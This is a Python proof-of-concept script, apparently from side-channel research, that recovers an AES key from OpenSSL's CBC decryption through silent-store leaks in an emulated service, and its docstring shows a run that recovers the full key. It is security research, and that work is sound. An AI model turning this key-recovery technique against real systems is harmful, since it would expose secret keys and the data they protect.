#!/usr/bin/env python3
"""
david.mateos@hestia:~$ ./src/attack_aes_dec_ssi.py
Real key: dd 74 07 d8 74 6f 5a ad c1 9b 4d 95 52 d5 6b ce
Last round key: 21 c1 5c 8f 7a ef 48 57 4d ba 93 56 80 75 ed 46

[0] starting
[0] 0.00% (0/65536)
[0] 1.53% (1000/65536)
...
[0] 45.78% (30000/65536)
[0] found one: ?? c1 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 75 ?? ??
[1] starting
[1] found one: ?? c1 ?? ?? ?? ?? ?? ?? ?? ba ?? ?? ?? 75 ?? ??
[2] starting
[2] found one: ?? c1 ?? ?? ?? ef ?? ?? ?? ba ?? ?? ?? 75 ?? ??
[3] starting
...
[3] 35.10% (23000/65536)
[3] found one: ?? c1 5c ?? ?? ef ?? ?? ?? ba 93 ?? ?? 75 ?? ??
[4] starting
...
[4] 27.47% (18000/65536)
[4] found one: ?? c1 5c ?? ?? ef 48 ?? ?? ba 93 ?? ?? 75 ed ??
[5] starting
...
[5] 54.93% (36000/65536)
[5] found one: ?? c1 5c 8f ?? ef 48 ?? ?? ba 93 ?? ?? 75 ed 46
[6] starting
[6] found one: ?? c1 5c 8f ?? ef 48 57 ?? ba 93 ?? ?? 75 ed 46
[7] starting
[7] found one: ?? c1 5c 8f ?? ef 48 57 ?? ba 93 56 ?? 75 ed 46

Recovered last round key: ?? c1 5c 8f ?? ef 48 57 ?? ba 93 56 ?? 75 ed 46
Original last round key:  21 c1 5c 8f 7a ef 48 57 4d ba 93 56 80 75 ed 46

Starting with 64 threads
[0] 0.00%
dd7407d8746f5aadc19b4d9552d56bce


Recovered key: dd 74 07 d8 74 6f 5a ad c1 9b 4d 95 52 d5 6b ce
Original key:  dd 74 07 d8 74 6f 5a ad c1 9b 4d 95 52 d5 6b ce

Times:
        Leak: 20.98m
        Bruteforce: 2.08s
        Total: 21.01m

"""
import ctypes
import time
import random
import itertools
import subprocess
from attack_common import hexspaces_known_pos, hexspaces, check_correct_file
from model import SilentStoreInitializedMemTracer, X86UnicornModel
from input_generator import AESEncryptInputGenerator, Input, AES_KEY, AES_ENCRYPT
from interfaces import RawTrace

MSG_LENGTH = 16
KEY_LENGTH = AESEncryptInputGenerator.KEYBYTES
IV_LENGTH = AESEncryptInputGenerator.AES_BLOCK_SIZE

c = ctypes.CDLL("targets/libcrypto.so")

class Service:
	"""
	This models a service that encrypts and decrypts messages with AES_cbc_encrypt
	and AES_cbc_decrypt using a secret key. It assumes the attacker can decrypt
	arbitrary messages, observe	silent stores when the stores value is 0, and get
	the trace of the PCs where those silent stores happened, using trace(). It
	also assumes the attacker can get an arbitrary plaintext and its corresponding
	ciphertext and IV using encrypt_random_msg(). The attacker's goal is to leak
	the secret key.
	"""

	def __init__(self):
		self.key = bytearray(random.randbytes(KEY_LENGTH))
		self.expanded_key = self.get_expanded_key()

		self.model = X86UnicornModel("targets/openssl", "aes_dec")
		self.model.tracer = SilentStoreInitializedMemTracer([0])
		self.input_gen = AESEncryptInputGenerator(self.model.STACK, self.model.STACK_SIZE)

	def trace(self, message: bytes, iv: bytes) -> RawTrace:
		assert len(iv) == IV_LENGTH
		input_ = self.input_gen.create_input(message, self.key, iv)
		trace, _ = self.model.trace_test_case(input_)
		return trace.trace

	def encrypt_random_msg(self):
		plain = random.randbytes(16)
		iv = random.randbytes(IV_LENGTH)
		iv_copy = bytes(bytearray(iv)) # AES_cbc_encrypt modifies iv :')
		aes_key = AES_KEY()
		c.AES_set_encrypt_key(bytes(self.key), len(self.key)*8, ctypes.byref(aes_key))
		cipher = ctypes.create_string_buffer(16)
		c.AES_cbc_encrypt(plain, cipher, len(plain), ctypes.byref(aes_key), iv_copy, AES_ENCRYPT)
		cipher = bytes(cipher)
		return plain, cipher, iv

	def get_expanded_key(self) -> bytes:
		# Beware1: expanded encryption and decryption keys are the same when we compile with
		# 'no-asm -DOPENSSL_AES_CONST_TIME'. Otherwise, in decryption the original key
		# corresponds to the last round key, instead of the first one. Use expanded encryption
		# key to solve this difference.
		aes_key = AES_KEY()
		c.AES_set_encrypt_key(bytes(self.key), len(self.key)*8, ctypes.byref(aes_key))
		if aes_key.rounds != 10:
			raise Exception(f"get_expanded_key: rounds={aes_key.rounds}, expected 10. maybe something wrong with AES_KEY?")
		expanded_key = bytearray(aes_key.rd_key)[:(aes_key.rounds+1)*2*8]

		# Beware2: key expansion in openssl uses GETU32, which may define other endianness.
		# If the first round key isnt the key, try fixing endianness
		if expanded_key[:16] != self.key:
			for i in range(0, len(expanded_key), 4):
				expanded_key[i+0], expanded_key[i+3] = expanded_key[i+3], expanded_key[i+0]
				expanded_key[i+1], expanded_key[i+2] = expanded_key[i+2], expanded_key[i+1]
		assert expanded_key[:16] == self.key

		return bytes(expanded_key)

def hexspaces_missing_bytes(s, i):
	known = []
	for indexes, _ in info[:i+1]:
		known += indexes
	return hexspaces_known_pos(s, known)

cache = {}
def trace_count(msg, pc, service):
	# Trace given msg with IV=0, and count how many times the given PC appears in the trace
	msg = bytes(msg)
	if msg not in cache:
		trace = service.trace(msg, bytes(IV_LENGTH))
		pcs = [int(observation, 16) for observation in trace]
		cache[msg] = pcs
	return cache[msg].count(pc)

# Pairs of leaked positions of the key and PC where the SS happens
info = [
	# First 4
	([0xd, 0x1], 0x4029f7),
	([0x9], 0x402a06),
	([0x5], 0x4029ff),

	# Next 2
	([0x2, 0xa], 0x402a0d),

	# Next 2
	([0x6, 0xe], 0x402a15),

	# Final 4
	([0x3, 0xf], 0x402a34),
	([0x7], 0x402a2d),
	([0xb], 0x402a2a),
]

def bruteforce_last_round_key_i(msg, i, service):
	indexes, pc = info[i]
	n = len(indexes)
	total_its = 0x100**n
	print(f"[{i}] starting")
	for it, bs in enumerate(itertools.product(range(0x100), repeat=n)):
		# Set bytes to our msg
		for idx, b in zip(indexes, bs):
			msg[idx] = b

		# Make sure we didn't lose any of the previous silent stores
		for _, pc_prev in info[:i]:
			if trace_count(msg, pc_prev, service) == 0:
				print(f"[{i}] bad: lost prev ss")
				return None

		# Check if we found current silent store
		if trace_count(msg, pc, service) > 0:
			print(f"[{i}] found one: {hexspaces_missing_bytes(msg, i)}")
			yield msg
			print(f"[{i}] resuming..")

		# Print some stats
		if n > 1 and it % 1000 == 0:
			perc = 100*it/total_its
			print(f"[{i}] {perc:.2f}% ({it}/{total_its})")

	# We exhausted all possible options
	print(f"[{i}] bad: exhausted")
	return None

def bruteforce_last_round_key_all(service, msg=bytearray(b"A"*MSG_LENGTH), i=0):
	# Explore the tree using depth-first, until one of the options gets to the bottom
	for msg in bruteforce_last_round_key_i(msg.copy(), i, service):
		if i == len(info)-1:
			return msg
		ret = bruteforce_last_round_key_all(service, msg.copy(), i+1)
		if ret is not None:
			return ret
	return None

def main():
	check_correct_file("targets/openssl")
	service = Service()

	# Print real keys
	print(f"Real key: {hexspaces(service.key)}")
	print(f"Last round key: {hexspaces(service.expanded_key[-16:])}\n")

	# Bruteforce last round key
	time_start = time.time()
	last_round_key = bruteforce_last_round_key_all(service)
	print()
	print(f"Recovered last round key: {hexspaces_missing_bytes(last_round_key, len(info))}")
	print(f"Original last round key:  {hexspaces(service.expanded_key[-16:])}\n")
	time_leak_end = time.time()

	# Get some random ciphertext
	msg, enc, iv = service.encrypt_random_msg()

	# Bruteforce the remaining 4 bytes
	time_bruteforce_start = time.time()
	argv = ["./attack_aes_dec_ssi_helper", msg.hex(), enc.hex(), iv.hex(), last_round_key.hex()]
	with subprocess.Popen(argv, stdout=subprocess.PIPE, bufsize=1, universal_newlines=True) as p:
		for line in p.stdout:
			print(line, end="")
	time_bruteforce_end = time.time()

	# Get the key from the last line of the output
	key = bytes.fromhex(line)
	print("\n")
	print("Recovered key:", hexspaces(key))
	print("Original key: ", hexspaces(service.key))

	print("\nTimes:")
	print(f"\tLeak: {(time_leak_end - time_start)/60:.2f}m")
	print(f"\tBruteforce: {time_bruteforce_end - time_bruteforce_start:.2f}s")
	print(f"\tTotal: {(time_bruteforce_end - time_start)/60:.2f}m")


if __name__ == "__main__":
	main()
